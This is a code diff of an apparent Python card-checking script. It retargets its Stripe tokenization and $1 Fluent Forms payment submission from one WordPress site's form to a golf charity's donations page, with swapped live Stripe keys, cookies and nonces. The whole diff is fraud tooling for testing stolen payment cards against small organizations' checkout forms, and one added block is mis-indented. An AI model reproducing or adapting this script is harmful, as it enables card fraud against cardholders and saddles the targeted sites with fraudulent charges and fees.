@@ -26,30 +26,26 @@ def Tele(ccx):
 			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
 	}
 
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51LyZmQCt7u53epdJaN2EfBYFT5v4hC78N80dedyFRFU3EFgoSZ9SR86kgt73cn0KBXwZL6NaRAzru7W7P1nJMx7U00jJDFzwwT'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NJgOXCjU8lO8MWc81K66yGhcm9C0UPHTGgfypyAMPmRU79JIeCDD5mPWBGOU2v8hcYshCsaVmnqNzl50NQEe4p100CxLWdRv1'
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 
 	pm = r1.json()['id']
-	
-	cookies = {
-	    '_ga': 'GA1.1.579353265.1725049342',
-	    'twk_idm_key': 'WVE-YEp_3JtqYzZ9Niajy',
-	    'TawkConnectionTime': '0',
-	    '__stripe_mid': 'cdbb85fa-54ec-4e16-a633-e5d9adf2c9777dcfa6',
-	    '__stripe_sid': 'aa1a374a-f940-4d30-b0ae-b37276fecfe2726d84',
-	    '_ga_2F3E3CB616': 'GS1.1.1725049342.1.1.1725049358.0.0.0',
+
+		cookies = {
+	    '__stripe_mid': '29b7e385-6f01-4cf6-b48f-ef916da42142d8ed93',
+	    '__stripe_sid': 'a20796ea-226d-4e43-9893-02d9b5e38119a42bed',
 	}
 	
 	headers = {
-	    'authority': 'business-umbrella.com',
+	    'authority': 'golf316.org',
 	    'accept': '*/*',
 	    'accept-language': 'en-US,en;q=0.9',
 	    'cache-control': 'no-cache',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '_ga=GA1.1.579353265.1725049342; twk_idm_key=WVE-YEp_3JtqYzZ9Niajy; TawkConnectionTime=0; __stripe_mid=cdbb85fa-54ec-4e16-a633-e5d9adf2c9777dcfa6; __stripe_sid=aa1a374a-f940-4d30-b0ae-b37276fecfe2726d84; _ga_2F3E3CB616=GS1.1.1725049342.1.1.1725049358.0.0.0',
-	    'origin': 'https://business-umbrella.com',
+	    # 'cookie': '__stripe_mid=29b7e385-6f01-4cf6-b48f-ef916da42142d8ed93; __stripe_sid=a20796ea-226d-4e43-9893-02d9b5e38119a42bed',
+	    'origin': 'https://golf316.org',
 	    'pragma': 'no-cache',
-	    'referer': 'https://business-umbrella.com/candidate-services/',
+	    'referer': 'https://golf316.org/donations/',
 	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -61,20 +57,14 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1725049513921',
+	    't': '1725183979566',
 	}
 	
 	data = {
-	    'data': '__fluent_form_embded_post_id=2972&_fluentform_3_fluentformnonce=41c6093853&_wp_http_referer=%2Fcandidate-services%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=rodamuser59%40outlook.com&dropdown_1=Training%20booking%20for%20candidates&custom-payment-amount_8=1&payment-coupon=&payment_method=stripe&__ff_all_applied_coupons=&pum_form_popup_id=720&__stripe_payment_method_id='+str(pm)+'',
+	    'data': '__fluent_form_embded_post_id=2161&_fluentform_7_fluentformnonce=4440d5f94d&_wp_http_referer=%2Fdonations%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=&payment_input=Other&custom-payment-amount=1&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
 	    'action': 'fluentform_submit',
-	    'form_id': '3',
+	    'form_id': '7',
 	}
 	
-	r2 = requests.post(
-	    'https://business-umbrella.com/wp-admin/admin-ajax.php',
-	    params=params,
-	    cookies=cookies,
-	    headers=headers,
-	    data=data,
-	)
+	r2 = requests.post('https://golf316.org/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
 	return (r2.json())
